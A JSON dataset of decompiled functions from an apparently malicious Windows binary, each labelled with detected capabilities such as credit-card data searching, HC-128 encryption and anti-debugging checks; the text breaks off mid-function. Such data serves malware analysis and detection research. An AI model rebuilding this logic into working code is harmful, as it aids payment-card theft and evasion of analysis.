{
    "0040433a": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.0040433a(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uchar auStack3092 [1024];\n    uchar auStack2068 [1024];\n    uchar auStack1044 [1024];\n    uchar auStack20 [4];\n    uchar auStack16 [4];\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_WriteConsoleW;\n    pcVar1 = _sym.imp.KERNEL32.dll_GetConsoleAliasA;\n    var_8h = *0x427724 >> 3;\n    if (var_8h != 0) {\n        var_4h = *0x427688;\n        do {\n            if (*0x427724 == 0x5d) {\n                (*_sym.imp.KERNEL32.dll_AddAtomW)(0);\n                (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, 0);\n                (*_sym.imp.KERNEL32.dll_RaiseException)(0, 0, 0, 0);\n                (*pcVar2)(0, 0, 0, auStack20, 0);\n                (*pcVar1)(0, auStack1044, 0, 0);\n                (*_sym.imp.KERNEL32.dll_LCMapStringA)(0, 0, 0x403f50, 0, auStack2068, 0);\n                (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x403f68);\n                (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x403f80);\n                (*pcVar2)(0, 0, 0, auStack16, 0);\n                (*pcVar1)(0, auStack3092, 0, 0);\n                (*_sym.imp.KERNEL32.dll_IsValidCodePage)(0);\n            }\n            fcn.004041ad(var_4h);\n            var_4h = var_4h + 8;\n            var_8h = var_8h - 1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "004044cf": {
        "rules": [
            "search for credit card data/ac143e9ae29c414184a69c9308e24693",
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b"
        ],
        "decompiled_code": "\nvoid fcn.004044cf(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint uStack2420;\n    uint uStack2416;\n    uint uStack2412;\n    uint uStack2408;\n    uint uStack2404;\n    uint uStack2400;\n    uint uStack2396;\n    uchar auStack2084 [16];\n    uchar auStack2068 [12];\n    uchar auStack2056 [2052];\n    \n    if (*0x427724 == 0x16) {\n        (*_sym.imp.USER32.dll_WindowFromDC)(0);\n        (*_sym.imp.KERNEL32.dll_GetProcAddress)(0, 0);\n        (*_sym.imp.KERNEL32.dll_WriteConsoleW)(0, 0, 0, &stack0xfffff574, 0);\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_FindNextFileA)(0, &uStack2420);\n        fcn.0040525a(0, 0, 0);\n    }\n    if (*0x427724 == 0xc) {\n        (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0x403fd0, 0, auStack2056, 0);\n        fcn.0040506c(0);\n        fcn.00404180(0, 0);\n        fcn.004051ba(0);\n    }\n    uVar7 = 0x403fd8;\n    *0x42768c = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x403fd8);\n    pcVar2 = _sym.imp.KERNEL32.dll_LocalAlloc;\n    uVar5 = 0;\n    uVar6 = *0x427724;\n    *0x427688 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, *0x427724);\n    fcn.00404425();\n    uVar3 = 0;\n    if (*0x427724 != 0) {\n        do {\n            *(*0x427688 + uVar3) = *(*0x428094 + 0xb2d3b + uVar3);\n            if (*0x427724 == 0x292) {\n                (*pcVar2)(0, 0);\n                (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, 0);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *0x427724);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_SetFileShortNameA;\n    iVar4 = 0;\n    do {\n        if (*0x427724 + iVar4 == 0x5e) {\n            (*_sym.imp.KERNEL32.dll_VerSetConditionMask)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_LCMapStringA)(0, 0, 0, 0, auStack2084, 0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA)(0);\n            (*pcVar2)(0, 0);\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x40c893);\n    iVar4 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n        if (iVar4 < 0x120723b) {\n            uStack2400 = 0x43b1fae2;\n            uStack2412 = 0x4a83859f;\n            uVar7 = 0x7adaa56b;\n            uStack2420 = 0x64e5d37a;\n            uStack2404 = 0x939e4492;\n            uStack2408 = 0xf14f54f8;\n            uStack2396 = 0x88537d24;\n            uStack2416 = 0xcaa858dd;\n        }\n        (*_sym.imp.KERNEL32.dll_GetGeoInfoA)(0, 0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetSystemDefaultLangID)();\n    } while ((iVar4 < 0x11bb641) && (iVar4 = iVar4 + 1,  iVar4 < 0x16f1ab24));\n    fcn.0040433a(uVar5, uVar6, uVar7);\n    iVar4 = 0;\n    do {\n        if (iVar4 == 0x770e) {\n            fcn.0040440b();\n            iVar4 = extraout_ECX;\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x286b97d);\n    iVar4 = 0x7b;\n    do {\n        if (*0x427724 == 0xd) {\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(0x403ff4, 0, auStack2068);\n            (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, 0);\n        }\n        if (*0x427724 == 0xf) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)(0, auStack2068, 0, 0);\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_GetFileAttributesA;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    iVar4 = 0x184cc;\n    do {\n        if (*0x427724 == 0x1833b) {\n            (*pcVar1)(0);\n            (*_sym.imp.KERNEL32.dll_SetComputerNameW)(0x404000);\n            (*_sym.imp.KERNEL32.dll_SetFirmwareEnvironmentVariableA)(0x40404c, 0x404024, 0, 0);\n            (*_sym.imp.KERNEL32.dll_TzSpecificLocalTimeToSystemTime)(&uStack2412, 0, 0);\n            (*pcVar1)(0x404078);\n            (*pcVar2)(0, 0);\n        }\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x404088);\n    return;\n}\n",
        "token_count": 1440
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00406ab0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00406ba3: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00406ba8)\n// WARNING: Removing unreachable block (ram,0x00406bd6)\n// WARNING: Removing unreachable block (ram,0x00406bae)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406ab0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004066f8(0x4111b0, 0x18);\n    fcn.0040a4e5(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x42698c != 1) {\n        *0x426988 = 1;\n        *0x426984 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00407654(*0x4281e8);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00407654(*0x4281e4);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0040764b();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00407654(*piVar2);\n                        iVar3 = fcn.0040764b();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00407654(*0x4281e8);\n                        piVar1 = fcn.00407654(*0x4281e4);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.004069ea(0x4011b4);\n        }\n        fcn.004069ea(0x4011bc);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040a40b(8);\n    }\n    return;\n}\n",
        "token_count": 798
    },
    "00407c44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c44(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x41255c) {\n        return;\n    }\n    *0x4271c8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4271cc = &arg_8h;\n    *0x427108 = 0x10001;\n    *0x4270b0 = 0xc0000409;\n    *0x4270b4 = 1;\n    var_328h = *0x41255c;\n    var_324h = *0x412560;\n    *0x4270bc = unaff_retaddr;\n    *0x427194 = in_GS;\n    *0x427198 = in_FS;\n    *0x42719c = in_ES;\n    *0x4271a0 = in_DS;\n    *0x4271a4 = unaff_EDI;\n    *0x4271a8 = unaff_ESI;\n    *0x4271ac = unaff_EBX;\n    *0x4271b0 = in_EDX;\n    *0x4271b4 = in_ECX;\n    *0x4271b8 = in_EAX;\n    *0x4271bc = unaff_EBP;\n    *0x4271c0 = unaff_retaddr;\n    *0x4271c4 = in_CS;\n    *0x4271d0 = in_SS;\n    *0x427100 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00407c3c(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x403460);\n    if (*0x427100 == 0) {\n        fcn.00407c3c(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 833
    },
    "0040ad2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040ad2b(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040a40b(0);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0040ae2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040ae2b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040764b();\n    var_4h = 0;\n    if (*0x427094 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x403454);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x403448);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x427094 = fcn.004075d9(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x403438);\n        *0x427098 = fcn.004075d9(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x403424);\n        *0x42709c = fcn.004075d9(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x403408);\n        *0x4270a4 = fcn.004075d9(uVar3);\n        if (*0x4270a4 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4033f0);\n            *0x4270a0 = fcn.004075d9(uVar3);\n        }\n    }\n    if ((*0x4270a0 != iVar1) && (*0x4270a4 != iVar1)) {\n        pcVar4 = fcn.00407654(*0x4270a0);\n        pcVar5 = fcn.00407654(*0x4270a4);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040af6d;\n        }\n    }\n    if ((((*0x427098 != iVar1) && (pcVar4 = fcn.00407654(*0x427098),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x42709c != iVar1 && (pcVar4 = fcn.00407654(*0x42709c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040af6d:\n    pcVar4 = fcn.00407654(*0x427094);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 824
    },
    "0040c49d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c49d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41255c ^ &stack0xfffffffc;\n    fcn.00405db3(arg_10h);\n    var_14h = fcn.0040f423(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040e99b(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040c4f6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c536;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040c528:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c536;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040c528;\n        goto code_r0x0040c4f6;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040c536:\n    fcn.00407c44(unaff_EBX);\n    return;\n}\n",
        "token_count": 509
    },
    "0040c545": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c545(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41255c ^ &stack0xfffffffc;\n    fcn.00405db3(arg_10h);\n    var_14h = fcn.0040f423(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040eedf(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040c59e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c5de;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040c5d0:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c5de;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040c5d0;\n        goto code_r0x0040c59e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040c5de:\n    fcn.00407c44(unaff_EBX);\n    return;\n}\n",
        "token_count": 512
    },
    "0040e99b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e99b(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040ee9c;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040ead0;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040ead7;\ncode_r0x0040ead0:\n                        do {\n                            var_4h = 1;\ncode_r0x0040ead7:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040eae5;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040eae5:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x412f18 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x412f18 < iVar12) {\n                if (iVar12 < *0x412f14) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x412f14;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040ee9c;\n            }\n            var_10h = *0x412f18 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040ec88;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040ec88:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 